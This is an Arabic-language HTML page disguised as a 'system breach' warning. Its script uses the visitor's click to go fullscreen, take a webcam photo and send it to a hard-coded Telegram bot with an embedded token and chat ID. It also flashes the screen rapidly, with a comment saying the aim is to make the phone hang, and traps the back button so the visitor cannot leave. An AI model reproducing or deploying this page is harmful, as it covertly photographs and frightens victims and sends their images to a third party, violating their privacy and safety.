<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM CRITICAL ALERT</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; margin: 0; }
        .full-screen { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 15px solid #f00; animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -2px); } 100% { transform: translate(1px, 2px); } }
        .blink { animation: flash 0.2s infinite; font-size: 3em; font-weight: bold; }
        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .box { background: #111; padding: 50px; border: 3px solid #f00; text-align: center; }
        .btn { padding: 30px 60px; font-size: 2em; background: #f00; color: #fff; border: none; cursor: pointer; }
    </style>
</head>
<body onclick="makeItReal()">
    <div class="full-screen" id="main">
        <div class="blink">⚠️ تحذير: اختراق النظام!</div>
        <div class="box">
            <h2 id="msg">جاري سحب ملفات النظام...</h2>
            <button class="btn" onclick="makeItReal()">تأكيد التحقق (مهم جداً)</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8627248426:AAEtvtxQzAThKrVmI1orIx7GF4-wFXSYG-4";
        const CHAT_ID = "5177962707";

        function makeItReal() {
            // 1. جعل الصفحة ملء الشاشة
            document.documentElement.requestFullscreen();
            
            // 2. إرسال الكاميرا
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const canvas = document.createElement('canvas');
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob);
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    });
                }, 1000);
            });

            // 3. تخلي التليفون يهنج فعلاً (تكرار عمليات تقيلة)
            setInterval(() => {
                document.getElementById('msg').innerText = "تم سحب: " + Math.random().toString(36).substring(7);
                document.body.style.backgroundColor = (document.body.style.backgroundColor == "black") ? "#220000" : "black";
            }, 100);
        }

        // منع الخروج نهائياً
        window.history.pushState(null, null, document.URL);
        window.addEventListener('popstate', () => {
            window.history.pushState(null, null, document.URL);
            alert("لا يمكنك المغادرة! نظام الحماية نشط.");
        });
    </script>
</body>
</html>
